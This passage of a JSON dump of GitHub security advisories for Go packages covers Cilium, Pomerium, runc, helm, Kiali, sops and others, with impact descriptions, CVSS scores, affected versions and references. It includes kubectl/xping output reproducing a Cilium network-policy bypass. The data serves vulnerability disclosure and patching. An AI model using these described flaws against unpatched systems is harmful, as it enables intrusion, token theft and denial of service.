(10.154.1.16): 56 data bytes\n64 bytes from 10.154.1.16: seq=0 ttl=60 time=0.822 ms\n\n--- 10.154.1.16 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss   <--- \"server-netpol\" policy allowed\nround-trip min/avg/max = 0.822/0.822/0.822 ms\n\n$ kubectl exec -ti server -- xping -c1 -x666 $CLIENT_POD_IP\nPING 10.154.0.50 (10.154.0.50): 56 data bytes\n64 bytes from 10.154.0.50: seq=0 ttl=60 time=0.527 ms\n\n--- 10.154.0.50 ping statistics ---\n1 packets transmitted, 1 packets received, 0% packet loss   <--- \"client-netpol\" policy bypassed\nround-trip min/avg/max = 0.527/0.527/0.527 ms\n```\n\n## For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [Cilium Issues](https://github.com/cilium/cilium/issues)\n- Email us at security@cilium.io", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.7.8"}, {"fixed": "1.7.15"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.7.14"}}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.3"}, {"fixed": "1.8.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.8.7"}}, {"package": {"ecosystem": "Go", "name": "github.com/cilium/cilium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.0"}, {"fixed": "1.9.5"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.9.4"}}], "references": [{"type": "WEB", "url": "https://github.com/cilium/cilium/security/advisories/GHSA-c66w-hq56-4q97"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-21T14:09:14Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-35vc-w93w-75c2", "modified": "2023-10-02T12:09:08Z", "published": "2021-05-21T16:24:34Z", "aliases": ["CVE-2021-29651"], "summary": "JWT leak via Open Redirect in Programmatic access", "details": "### Impact\nUsing programmatic access on protected sites, one can get a signed login URL with pomerium_redirect_uri set to an arbitrary URL. Then, if the user has already logged into Pomerium, they will be redirected to the specified pomerium_redirect_uri with a JWT attached. This allows an outside attacker to get a signed login URL that, upon visiting it, will redirect a victim to the attacker\u2019s site. This creates an issue of Open Redirect and, more seriously, JWT leakage.\n\nWith a leaked JWT, the attacker will be able to unveil the victim\u2019s identity (.e.g. email address) by supplying the JWT to the authenticate service or verify.pomerium.com. In addition, if an application integrating Pomerium only verifies the iss claim and others but not the aud claim, the attacker will be able to access it as the victim.\n\n### Specific Go Packages Affected\ngithub.com/pomerium/pomerium/proxy\n\n### Patches\nPatched in Pomerium v0.13.4\n\n### For more information\nIf you have any questions or comments about this advisory\n* Open an issue in [pomerium](http://github.com/pomerium/pomerium)\n* Email us at [security@pomerium.com](mailto:security@pomerium.com)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.13.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pomerium/pomerium/security/advisories/GHSA-35vc-w93w-75c2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29651"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/pull/2049"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-20T20:25:40Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7qw8-847f-pggm", "modified": "2023-02-14T17:41:32Z", "published": "2021-05-10T19:35:07Z", "aliases": ["CVE-2021-20291"], "summary": "Improper Locking in github.com/containers/storage", "details": "A deadlock vulnerability was found in `github.com/containers/storage` in versions before 1.28.1. When a container image is processed, each layer is unpacked using `tar`. If one of those layers is not a valid `tar` archive this causes an error leading to an unexpected situation where the code indefinitely waits for the tar unpacked stream, which never finishes. An attacker could use this vulnerability to craft a malicious image, which when downloaded and stored by an application using containers/storage, would then cause a deadlock leading to a Denial of Service (DoS).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/storage"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.28.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-20291"}, {"type": "WEB", "url": "https://github.com/containers/storage/pull/860"}, {"type": "WEB", "url": "https://github.com/containers/storage/commit/306fcabc964470e4b3b87a43a8f6b7d698209ee1"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1939485"}, {"type": "PACKAGE", "url": "https://github.com/containers/storage"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/R5D7XL7FL24TWFMGQ3K2S72EOUSLZMKL/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/SPYOHNG2Q7DCAQZMGYLMENLKALGDLG3X/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/WX24EITRXVHDM5M223BVTJA2ODF2FSHI/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZNMB7O2UIXE34PGSCSOULGHPX5LIJBMM/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0100"}, {"type": "WEB", "url": "https://unit42.paloaltonetworks.com/cve-2021-20291/"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-667"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-04T19:15:55Z", "nvd_published_at": "2021-04-01T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g636-q5fc-4pr7", "modified": "2021-05-21T22:11:53Z", "published": "2021-05-24T17:00:27Z", "aliases": [], "summary": "accounts: Hash account number using Salt", "details": "@alovak found that currently when we build hash of account number we do not \"salt\" it. Which makes it vulnerable to rainbow table attack.\n\n**What did you expect to see?**\nI expected salt (some random number from configuration) to be used in [hash.AccountNumber](https://github.com/moov-io/customers/blob/master/pkg/secrets/hash/account_number.go#L13)\n\nI would generate salt per tenant at least (maybe per organization).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/moov-io/customers"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/moov-io/customers/security/advisories/GHSA-g636-q5fc-4pr7"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:11:53Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5v95-v8c8-3rh6", "modified": "2021-05-20T22:26:21Z", "published": "2021-05-21T14:32:55Z", "aliases": ["CVE-2021-22538"], "summary": "Privilege escalation in rbac", "details": "### Impact\nUsing a carefully crafted request or malicious proxy, a user with `UserWrite` permissions could create another user with higher privileges than their own due to insufficient checks on the allowed set of permissions. The event would be captured in the Event Log.\n\n### Patches\nThe issue has been fixed in 0.24.0 and 0.23.1.\n\n### Workarounds\nFor users who are unable to upgrade, we recommend auditing users who have `UserWrite` permissions and regularly reviewing the Event Log for malicious activity.\n\n### Kudos\nThank you to Michael Mazzolini (Ethical Hacker at WHO) for finding and disclosing this vulnerability.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/exposure-notifications-verification-server"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.23.1"}]}], "database_specific": {"last_known_affected_version_range": "< 0.23.0"}}], "references": [{"type": "WEB", "url": "https://github.com/google/exposure-notifications-verification-server/security/advisories/GHSA-5v95-v8c8-3rh6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-22538"}, {"type": "WEB", "url": "https://github.com/google/exposure-notifications-verification-server/commit/eb8cf40b12dbe79304f1133c06fb73419383cd95"}, {"type": "WEB", "url": "https://github.com/google/exposure-notifications-verification-server/releases/tag/v0.23.1"}, {"type": "WEB", "url": "https://github.com/google/exposure-notifications-verification-server/releases/tag/v0.24.0"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-20T22:26:21Z", "nvd_published_at": "2021-03-31T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h3p9-wrgx-82cm", "modified": "2023-09-29T15:41:15Z", "published": "2021-05-18T18:18:50Z", "aliases": ["CVE-2019-19316"], "summary": "Use of a Broken or Risky Cryptographic Algorithm in Terraform", "details": "When using the Azure backend with a shared access signature (SAS), Terraform versions prior to 0.12.17 may transmit the token and state snapshot using cleartext HTTP.\n\n### Specific Go Packages Affected\ngithub.com/hashicorp/terraform/backend/remote-state/azure", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/terraform"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.17"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hashicorp/terraform/security/advisories/GHSA-4rvg-555h-r626"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19316"}, {"type": "WEB", "url": "https://github.com/hashicorp/terraform/issues/23493"}, {"type": "WEB", "url": "https://github.com/hashicorp/terraform/commit/6db3cf8e5b4cfb2a3cd1d99a813b50b2d5d363bb"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-327"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-13T15:15:38Z", "nvd_published_at": "2019-12-02T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qq5v-f4c3-395c", "modified": "2021-05-21T14:15:41Z", "published": "2021-05-21T14:31:41Z", "aliases": ["CVE-2021-23347"], "summary": "Possible XSS when using SSO with the CLI in github.com/argoproj/argo-cd/v2", "details": "### Impact\n\nWhen using SSO with the Argo CD CLI, a malicious SSO provider could have sent specially crafted error message that would result in XSS on the client by means of executing arbitrary JavaScript code.\n\nWe believe the exploitation of this vulnerability is only be possible when Argo CD is connected to a compromised/malicious SSO provider.\n\n### Patches\n\nA patch for this vulnerability is available with the v1.8.7 and v1.7.14 releases of Argo CD.\n\n### Workarounds\n\n* Do not use SSO with the CLI when you don't trust your SSO provider\n\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel `#argo-cd`\n\n### Credits\n\nThe issue was found during static code scanning with CodeQL and fixed by the Argo CD team. While we believed that a rogue SSO provider would pose a severe threat by itself, we fixed it like a regular bug.\n\nThe Argo CD team would like to thank Adam Gold of Snyk (https://snyk.io) for stepping up and classifying this correctly as a  security issue and for his help in determining its severity. Also, Snyk kindly reserved and provided the CVE for this vulnerability.\n\nWe fully agree with Adam that this bug is a security vulnerability and justifies publishing a SA, to provide our community and users full transparancy.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.0"}, {"fixed": "1.8.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-qq5v-f4c3-395c"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T14:15:41Z", "nvd_published_at": "2021-03-03T10:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-64rh-r86q-75ff", "modified": "2021-05-06T21:51:32Z", "published": "2021-05-18T18:28:59Z", "aliases": ["CVE-2020-1764"], "summary": "Hard coded cryptographic key in Kiali", "details": "A hard-coded cryptographic key vulnerability in the default configuration file was found in Kiali, all versions prior to 1.15.1. A remote attacker could abuse this flaw by creating their own JWT signed tokens and bypass Kiali authentication mechanisms, possibly gaining privileges to view and alter the Istio configuration.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kiali/kiali"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.15.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-1764"}, {"type": "WEB", "url": "https://github.com/kiali/kiali/commit/93f5cd0b6698e8fe8772afb8f35816f6c086aef1"}, {"type": "WEB", "url": "https://github.com/kiali/kiali/commit/ac7bd6c7ddb2e01356e21d360dd1c718a90706ad"}, {"type": "WEB", "url": "https://github.com/kiali/kiali/commit/ce48af57113c805a25179aaab1a0fac2fb93653f"}, {"type": "WEB", "url": "https://github.com/kiali/kiali/commit/faed1f5f90efae3df9fd6fb793f00ccc242b3a96"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1810383"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-1764"}, {"type": "WEB", "url": "https://github.com/jpts/cve-2020-1764-poc"}, {"type": "WEB", "url": "https://kiali.io/news/security-bulletins/kiali-security-001/"}], "database_specific": {"cwe_ids": ["CWE-321", "CWE-798"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-06T21:51:32Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jhj6-5mh6-4pvf", "modified": "2023-10-02T15:30:28Z", "published": "2021-05-24T17:00:46Z", "aliases": ["CVE-2020-26213"], "summary": "Denial-of-Service within Docker container", "details": "### Impact\nIf you run teler inside a Docker container and encounter `errors.Exit` function, it will cause denial-of-service (`SIGSEGV`) because it doesn't get process ID and process group ID of teler properly to kills.\n\n### Specific Go Packages Affected\nktbs.dev/teler/pkg/errors\n\n### Patches\nUpgrade to the >= 0.0.1 version.\n\n### Workarounds\nN/A\n\n### References\n- https://github.com/kitabisa/teler/commit/ec6082049dba9e44a21f35fb7b123d42ce1a1a7e\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Issues Section](https://github.com/kitabisa/teler/issues)\n* Email us at [infosec@kitabisa.com](mailto:infosec@kitabisa.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "ktbs.dev/teler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kitabisa/teler/security/advisories/GHSA-jhj6-5mh6-4pvf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-26213"}, {"type": "WEB", "url": "https://github.com/kitabisa/teler/commit/ec6082049dba9e44a21f35fb7b123d42ce1a1a7e"}, {"type": "PACKAGE", "url": "https://github.com/kitabisa/teler"}], "database_specific": {"cwe_ids": ["CWE-476"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-21T22:09:36Z", "nvd_published_at": "2020-11-06T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m54r-vrmv-hw33", "modified": "2023-10-02T14:09:08Z", "published": "2021-05-24T16:57:12Z", "aliases": ["CVE-2020-15186"], "summary": "Improper Sanitizing of plugin names in helm", "details": "### Impact\n\nSecurity researchers at Trail of Bits discovered that plugin names are not sanitized properly. As a result, a malicious plugin author could use characters in a plugin name that would result in unexpected behavior, such as duplicating the name of another plugin or spoofing the output to `helm --help`.\n\n### Specific Go Packages Affected\nhelm.sh/helm/v3/pkg/plugin\n\n### Patches\n\nThis issue has been patched in Helm 3.3.2.\n\n### Workarounds\n\nDo not install untrusted Helm plugins. Examine the `name` field in the `plugin.yaml` file for a plugin, looking for characters outside of the [a-zA-Z0-9._-] range.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.0.0"}, {"fixed": "3.3.2"}]}]}, {"package": {"ecosystem": "Go", "name": "helm.sh/helm"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.16.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-m54r-vrmv-hw33"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15186"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/809e2d999e2c33e20e77f6bff30652d79c287542"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/c8d6b01d72c9604e43ee70d0d78fadd54c2d8499"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-74"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-24T16:45:43Z", "nvd_published_at": "2020-09-17T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x5c7-x7m2-rhmf", "modified": "2021-05-20T16:50:13Z", "published": "2021-05-20T16:50:34Z", "aliases": [], "summary": "Local directory executable lookup in sops (Windows-only)", "details": "### Impact\nWindows users using the sops direct editor option (`sops file.yaml`) can have a local executable named either `vi`, `vim`, or `nano` executed if running sops from `cmd.exe`\n\nThis attack is only viable if an attacker is able to place a malicious binary within the directory you are running sops from. As well, this attack will only work when using `cmd.exe` or the Windows C library [SearchPath function](https://docs.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-searchpatha). This is a result of these Windows tools including `.` within their `PATH` by default.\n\n**If you are using sops within untrusted directories on Windows via `cmd.exe`, please upgrade immediately** \n\n**As well, if you have `.` within your default $PATH, please upgrade immediately.**\n\nMore information can be found on the official Go blog: https://blog.golang.org/path-security\n\n### Patches\nThe problem has been resolved in v3.7.1\n\nNow, if Windows users using cmd.exe run into this issue, a warning message will be printed:\n`vim resolves to executable in current directory (.\\vim.exe)`\n\n### References\n* https://blog.golang.org/path-security\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a discussion in [sops](https://github.com/mozilla/sops/discussions)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "go.mozilla.org/sops/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/mozilla/sops/security/advisories/GHSA-x5c7-x7m2-rhmf"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2021-05-20T16:50:13Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-44r7-7p62-q3fr", "modified": "2023-08-29T22:33:25Z", "published": "2021-05-18T21:09:13Z", "aliases": ["CVE-2019-19794"], "summary": "miekg/dns insecurely generates random numbers", "details": "The miekg Go DNS package before 1.1.25, as used in CoreDNS before 1.6.6 and other products, improperly generates random numbers because math/rand is used. The TXID becomes predictable, leading to response forgeries.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/miekg/dns"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.25"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19794"}, {"type": "WEB", "url": "https://github.com/coredns/coredns/issues/3519"}, {"type": "WEB", "url": "https://github.com/coredns/coredns/issues/3547"}, {"type": "WEB", "url": "https://github.com/miekg/dns/issues/1037"}, {"type": "WEB", "url": "https://github.com/miekg/dns/issues/1043"}, {"type": "WEB", "url": "https://github.com/miekg/dns/pull/1044"}, {"type": "WEB", "url": "https://github.com/miekg/dns/commit/8ebf2e419df7857ac8919baa05248789a8ffbf33"}, {"type": "WEB", "url": "https://github.com/miekg/dns/compare/v1.1.24...v1.1.25"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0008"}], "database_specific": {"cwe_ids": ["CWE-330", "CWE-338"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-18T20:42:52Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-58pf-pcwv-qg85", "modified": "2022-08-02T18:03:17Z", "published": "2021-05-18T21:08:28Z", "aliases": ["CVE-2020-7665"], "summary": "Path traversal in u-root", "details": "This affects all versions of package github.com/u-root/u-root/pkg/uzip. It is vulnerable to both leading and non-leading relative path traversal attacks in zip file extraction.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/u-root/u-root"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-7665"}, {"type": "WEB", "url": "https://github.com/u-root/u-root/pull/1817"}, {"type": "WEB", "url": "https://github.com/u-root/u-root/pull/2344"}, {"type": "WEB", "url": "https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMUROOTUROOTPKGUZIP-570441"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-18T20:51:25Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5r2v-6gm6-vpvh", "modified": "2021-05-17T16:36:54Z", "published": "2021-05-18T17:33:58Z", "aliases": ["CVE-2019-14544"], "summary": "Insecure Permissions in Gogs", "details": "routes/api/v1/api.go in Gogs 0.11.86 lacks permission checks for routes: deploy keys, collaborators, and hooks.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.11.91"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-14544"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/5764"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/c3af3ff1d0484de3bd789ee6c6e47f35d590e945"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2021-05-17T16:36:54Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-gh32-pc56-4c96", "modified": "2023-09-15T19:47:45Z", "published": "2021-05-18T18:35:02Z", "aliases": ["CVE-2020-10750"], "summary": "Information Exposure in jaeger", "details": "Sensitive information written to a log file vulnerability was found in jaegertracing/jaeger before version 1.18.1 when the Kafka data store is used. This flaw allows an attacker with access to the container's log file to discover the Kafka credentials.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/jaegertracing/jaeger"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.18.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-10750"}, {"type": "WEB", "url": "https://github.com/jaegertracing/jaeger/commit/360c38bec3f9718ebba7ddbf0b409b05995f3ace"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1838401"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2020-10750"}, {"type": "WEB", "url": "https://github.com/jaegertracing/jaeger/releases/tag/v1.18.1"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-12T14:55:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-jp4j-47f9-2vc3", "modified": "2023-09-29T16:33:59Z", "published": "2021-05-18T18:14:55Z", "aliases": ["CVE-2019-13126"], "summary": "Integer Overflow or Wraparound in NATS Server", "details": "An integer overflow in NATS Server before 2.2.0 allows a remote attacker to crash the server by sending a crafted request.\n\n### Specific Go Packages Affected\ngithub.com/nats-io/nats-server/v2/server", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/nats-io/nats-server/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-13126"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/pull/1053"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/pull/1441"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/commit/07ef71ff98f45f8c2711be4aeaf484610d891dda"}, {"type": "WEB", "url": "https://github.com/nats-io/nats-server/commits/master"}, {"type": "WEB", "url": "https://www.twistlock.com/labs-blog/finding-dos-vulnerability-nats-go-fuzz-cve-2019-13126/"}], "database_specific": {"cwe_ids": ["CWE-190"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-17T16:35:04Z", "nvd_published_at": "2019-07-29T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fh74-hm69-rqjw", "modified": "2023-10-25T14:24:50Z", "published": "2021-05-27T18:41:17Z", "aliases": ["CVE-2019-19921"], "summary": "opencontainers runc contains procfs race condition with a shared volume mount", "details": "### Impact\nBy crafting a malicious root filesystem (with `/proc` being a symlink to a directory which was inside a volume shared with another running container), an attacker in control of both containers can trick `runc` into not correctly configuring the container's security labels and not correctly masking paths inside `/proc` which contain potentially-sensitive information about the host (or even allow for direct attacks against the host).\n\nIn order to exploit this bug, an untrusted user must be able to spawn custom containers with custom mount configurations (such that a volume is shared between two containers). It should be noted that we consider this to be a fairly high level of access for an untrusted user -- and we do not recommend allowing completely untrusted users to have such degrees of access without further restrictions.\n\n### Specific Go Package Affected\ngithub.com/opencontainers/runc/libcontainer\n\n### Patches\nThis vulnerability has been fixed in `1.0.0-rc10`. It should be noted that the current fix is effectively a hot-fix, and there are known ways for it to be worked around (such as making the entire root filesystem a shared volume controlled by another container). We recommend that users review their access policies to ensure that untrusted users do not have such high levels of controls over container mount configuration.\n\n### Workarounds\nIf you are not providing the ability for untrusted users to configure mountpoints for `runc` (or through a higher-level tool such as `docker run -v`) then you are not vulnerable to this issue. This exploit requires fairly complicated levels of access (which are available for some public clouds but are not necessarily available for all deployments).\n\nAdditionally, it appears as though it is not possible to exploit this vulnerability through Docker (due to the order of mounts Docker generates). However you should not depend on this, as it may be possible to work around this roadblock.\n\n### Credits\nThis vulnerability was discovered by Cure53, as part of a third-party security audit.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* [Open an issue](https://github.com/opencontainers/runc/issues/new).\n* Email us at [dev@opencontainers.org](mailto:dev@opencontainers.org), or [security@opencontainers.org](mailto:security@opencontainers.org) if you think you've found a security bug.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N/E:U/RL:U/RC:U"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/opencontainers/runc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0-rc9.0.20200122160610-2fc03cc11c77"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/opencontainers/runc/security/advisories/GHSA-fh74-hm69-rqjw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2019-19921"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/issues/2197"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/pull/2190"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/pull/2207"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/commit/2fc03cc11c775b7a8b2e48d7ee447cb9bef32ad0"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0688"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2020:0695"}, {"type": "WEB", "url": "https://github.com/opencontainers/runc/releases"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/03/msg00023.html"}, {"type": "WEB", "url": 